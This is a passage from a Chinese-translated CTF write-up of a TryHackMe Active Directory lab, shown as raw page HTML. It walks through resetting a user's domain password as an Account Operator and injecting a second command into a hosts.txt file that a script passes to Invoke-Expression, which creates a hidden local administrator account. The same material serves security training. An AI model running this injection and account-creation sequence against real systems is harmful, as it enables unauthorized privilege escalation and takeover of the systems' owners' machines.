<br/>BUILTIN\Pre-Windows 2000 Compatible Access  Alias                                      <br/><strong class="mx ir">BUILTIN\Account Operators                   Alias</strong>                                      <br/>BUILTIN\Remote Desktop Users                Alias                                      <br/>BUILTIN\Remote Management Users             Alias                                     </span></pre><p id="7bad" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">继续我的列举，我还在c盘中发现了一个名为<strong class="kf ir"> scripts </strong>的可疑文件夹。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="ef31" class="nb lk iq mx b gy nc nd l ne nf">*Evil-WinRM* PS C:\&gt; dir</span><span id="dd6b" class="nb lk iq mx b gy ng nd l ne nf">Directory: C:\</span><span id="094c" class="nb lk iq mx b gy ng nd l ne nf">Mode                LastWriteTime         Length Name<br/>----                -------------         ------ ----<br/>d-----         5/2/2020   6:33 AM                inetpub<br/>d-----        9/15/2018  12:19 AM                PerfLogs<br/>d-r---         5/8/2020   7:43 AM                Program Files<br/>d-----         5/7/2020   2:51 AM                Program Files (x86)<br/><strong class="mx ir">d-----         5/3/2020   5:48 AM                scripts</strong><br/>d-----        5/29/2020   5:45 PM                Shared<br/>d-r---         5/2/2020   3:05 PM                Users<br/>d-----        5/30/2020   7:00 AM                Windows</span></pre><p id="5c84" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">scripts文件夹包含一个名为<strong class="kf ir"> checkservers.ps1 </strong>的PowerShell脚本，用于检查位于“<em class="lb"> C:\Users\brittanycr\ </em>中的名为<strong class="kf ir"> hosts.txt </strong>的文件，并将主机文件的内容传递给<a class="ae kc" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2" rel="noopener ugc nofollow" target="_blank"><strong class="kf ir">Invoke-Expression</strong></a>。</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/c59e3073f2b501a28ecbb265ef7dafbf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1382/format:webp/1*C-pa1PFwkOlBYjJgQin-NA.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">PowerShell脚本片段。</figcaption></figure><p id="a94f" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如果我们可以修改hosts.txt文件并包含一个添加新用户的命令，它将作为管理员执行。为此，我可以更改用户<strong class="kf ir"> brittanycr </strong>的凭证，因为buse是Account Operators组的成员。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="b2b4" class="nb lk iq mx b gy nc nd l ne nf">*Evil-WinRM* PS C:\scripts&gt; <strong class="mx ir">net user brittanycr SecretPass1234 /domain</strong></span><span id="d742" class="nb lk iq mx b gy ng nd l ne nf">The command completed successfully.</span></pre><p id="c4f2" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我无法使用evil-winrm与<strong class="kf ir"> brittanycr </strong>用户建立远程连接。之前，我已经注意到可以通过SMB访问<strong class="kf ir">用户</strong>文件夹。我创建了一个新的hosts.txt文件，并包含一个命令，当执行该命令时，将添加一个名为<strong class="kf ir">hack activities</strong>的新用户。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="601e" class="nb lk iq mx b gy nc nd l ne nf">; net user hacktivities Pass1234$ /add; net localgroup Administrators hacktivities /add</span></pre><p id="8d5c" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">接下来，我使用smbclient通过brittanycr的凭证连接到用户共享，并从我的攻击机器上传新的hosts.txt文件。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="1a66" class="nb lk iq mx b gy nc nd l ne nf">smbclient //10.10.252.35/Users -U brittanycr</span><span id="5b7c" class="nb lk iq mx b gy ng nd l ne nf"><br/>smb: \&gt; cd brittanycr\<br/>smb: \brittanycr\&gt; dir<br/>  .                           D        0  Sun May  3 00:36:46 2020<br/>  ..                          D        0  Sun May  3 00:36:46 2020<br/>  hosts.txt                   A       22  Sun May  3 14:44:57 2020</span><span id="6e70" class="nb lk iq mx b gy ng nd l ne nf">smb: \brittanycr\&gt; <strong class="mx ir">put hosts.txt</strong><br/>putting file hosts.txt as \brittanycr\hosts.txt (0.1 kb/s) (average 0.1 kb/s)</span></pre><p id="055d" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">为了检查用户黑客活动是否已经被添加，我可以使用<strong class="kf ir"> crackmapexec </strong>来验证它的存在。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="11d1" class="nb lk iq mx b gy nc nd l ne nf">crackmapexec smb windcorp.thm -u hacktivities -p Pass1234$</span></pre><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oc"><img src="../Images/11515f73c6908d2f592ec67e4860b787.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*43Q_NfiQMNHfIVOimJYWXg.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">帐户已成功添加。</figcaption></figure><p id="35d0" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我可以看到帐户已成功添加。我现在可以使用evil-winrm登录并检索最终的标志。</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi od"><img src="../Images/ab148d66efe010b5c245d3aa998fbf36.png" data-original-src="https://miro.medium.com/v2/resize:fit:1396/format:webp/1*b1VEycwWvLx8MkWT6HtQEg.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">旗帜3。</figcaption></figure></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="de19" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">最后的想法</h1><p id="f369" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">我真的很喜欢在这个房间里工作，并有机会学习更多关于利用Active Directory域控制器的知识。挑战有一个很好的进展，需要良好的计数技能来完成。谢谢你一直读到最后，继续黑下去😄！</p><div class="oe of gp gr og oh"><a href="https://tryhackme.com/" rel="noopener  ugc nofollow" target="_blank"><div class="oi ab fo"><div class="oj ab ok cl cj ol"><h2 class="bd ir gy z fp om fr fs on fu fw ip bi translated">网络安全培训</h2><div class="oo l"><h3 class="bd b gy z fp om fr fs on fu fw dk translated">TryHackMe是一个免费的学习网络安全的在线平台，使用动手练习和实验室，通过您的…</h3></div><div class="op l"><p class="bd b dl z fp om fr fs on fu fw dk translated">tryhackme.com</p></div></div><div class="oq l"><div class="or l os ot ou oq ov jw oh"/></div></div></a></div></div></div>    
</body>
</html>